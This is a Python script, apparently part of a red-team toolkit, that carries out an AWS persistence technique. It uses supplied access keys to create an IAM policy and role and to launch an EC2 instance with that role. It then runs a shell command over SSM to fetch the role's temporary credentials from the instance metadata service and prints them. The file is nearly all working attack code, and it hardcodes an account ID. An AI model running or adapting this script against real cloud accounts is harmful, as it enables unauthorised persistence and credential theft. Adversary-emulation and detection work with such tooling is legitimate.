# AWS TTP Persistence / Persistence using EC2 and role.
# CreateUser DeleteUser CreateAccessKey DeleteAccessKey
# Hashicorp Red
import boto3
import time
import json

region = "us-west-2"
payload_url = ""

def listActions():
    print('CreatePolicy ✓')
    print('CreateRole ✓')
    print('RunInstances ✓')
    print('RunCommand ✓')

def send_cmd(cmd,i,ak,sk):
    session = boto3.session.Session(aws_access_key_id=ak, aws_secret_access_key=sk, region_name=region)
    instance_id = i
    ssm_client = session.client('ssm')
    response = ssm_client.send_command(
        InstanceIds=[
            instance_id
        ],
        DocumentName="AWS-RunShellScript",
        Parameters={
            'commands':[
            cmd
            ]
        })

    command_id = response['Command']['CommandId']
    time.sleep(5) # wait for command to complete
    output = ssm_client.get_command_invocation(
        CommandId=command_id,
        InstanceId=instance_id,
        )
    return output

def create_role(ak,sk):
    session = boto3.session.Session(aws_access_key_id=ak, aws_secret_access_key=sk, region_name=region)
    client = session.client('iam')
    with open('modules/policies/ssm.json') as json_file:
        policy_json = json.load(json_file)
    client.create_policy(
        PolicyName='SSM_EC2',
        PolicyDocument=json.dumps(policy_json),
        Description='SSM Role for EC2'
        )
    with open('modules/policies/trust.json') as json_file:
        trust_json = json.load(json_file)
    client.create_role(
        RoleName='SSM_EC2_Role',
        AssumeRolePolicyDocument=json.dumps(trust_json)
    )
    time.sleep(2)
    client.attach_role_policy(
        PolicyArn='arn:aws:iam::240213749104:policy/SSM_EC2',
        RoleName='SSM_EC2_Role'
    )
    client.create_instance_profile(
        InstanceProfileName='SSM_EC2_Role'
    )
    client.add_role_to_instance_profile (
        InstanceProfileName = 'SSM_EC2_Role',
        RoleName            = 'SSM_EC2_Role' 
    )
    return True

def createec2_persist(ak,sk):
    print('\nExecuting EC2 CreateInstance Persistence:')
    create_role(ak,sk)
    time.sleep(15)
    # Use supplied iam keys
    session = boto3.session.Session(aws_access_key_id=ak, aws_secret_access_key=sk, region_name=region)
    ec2 = session.resource('ec2')
    instance = ec2.create_instances(
        ImageId='ami-003634241a8fcdec0', 
        MinCount=1, MaxCount=1, 
        IamInstanceProfile={
        'Name': 'SSM_EC2_Role'
        })
    time.sleep(5)
    instance_id = instance[0].instance_id
    instance = ec2.Instance(instance_id)
    while instance.state['Name'] not in ('stopped','running'):
        print(instance.state)
        time.sleep(5)
        instance.load()
    result = None
    while result is None:
        try:
            # connect
            result = send_cmd('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/SSM_EC2_Role',instance_id,ak,sk)
        except:
            pass
    print(result)
    listActions()
    return True